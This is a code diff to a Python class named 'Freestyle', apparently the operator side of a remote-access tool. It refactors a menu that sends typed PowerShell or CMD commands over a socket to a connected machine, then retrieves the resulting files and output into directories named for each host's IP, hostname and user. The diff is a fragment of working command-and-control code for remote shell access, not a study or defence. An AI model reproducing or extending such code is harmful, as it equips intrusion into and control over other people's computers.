@@ -26,7 +26,7 @@ class Freestyle:
 
         return
 
-    def execute(self, platform):
+    def recv_file(self, text):
         def make_dir():
             # Create a directory with host's name if not already exists.
             for item in self.tmp_availables:
@@ -44,32 +44,6 @@ class Freestyle:
                                 pass
 
                             return ipval, host, user, path
-
-        def command():
-            while True:
-                if str(platform) == "ps":
-                    try:
-                        self.con.send("ps".encode())
-                        cmd = input("PS>")
-                        self.con.send(cmd.encode())
-                        time.sleep(1)
-                        return cmd
-
-                    except (WindowsError, socket.error) as e:
-                        print(e)
-                        return False
-
-                elif str(platform) == "cmd":
-                    try:
-                        self.con.send("cmd".encode())
-                        cmd = input("CMD>")
-                        self.con.send(cmd.encode())
-                        time.sleep(1)
-                        return cmd
-
-                    except (WindowsError, socket.error) as e:
-                        print(e)
-                        return False
 
         def file_name():
             try:
@@ -147,12 +121,41 @@ class Freestyle:
             shutil.move(src, dst)
 
         ipval, host, user, path = make_dir()
-        cmd = command()
         filename = file_name()
         fetch(filename)
-        output()
+        if text:
+            output()
+
         confirm()
         move(filename, path)
+
+    def execute(self, platform):
+        while True:
+            if str(platform) == "ps":
+                try:
+                    self.con.send("ps".encode())
+                    cmd = input("PS>")
+                    self.con.send(cmd.encode())
+                    time.sleep(1)
+
+                    return True
+
+                except (WindowsError, socket.error) as e:
+                    print(e)
+                    return False
+
+            elif str(platform) == "cmd":
+                try:
+                    self.con.send("cmd".encode())
+                    cmd = input("CMD>")
+                    self.con.send(cmd.encode())
+                    time.sleep(1)
+
+                    return True
+
+                except (WindowsError, socket.error) as e:
+                    print(e)
+                    return False
 
     def freestyle(self):
         while True:
@@ -177,12 +180,13 @@ class Freestyle:
                 if int(choice) == 1:
                     ex = "ps"
                     self.execute(ex)
-                    continue
+                    self.recv_file(text=True)
 
                 # Run CMD Command
                 elif int(choice) == 2:
                     ex = "cmd"
                     self.execute(ex)
+                    self.recv_file(text=True)
 
                 elif int(choice) == 0:
                     self.con.send("back".encode())
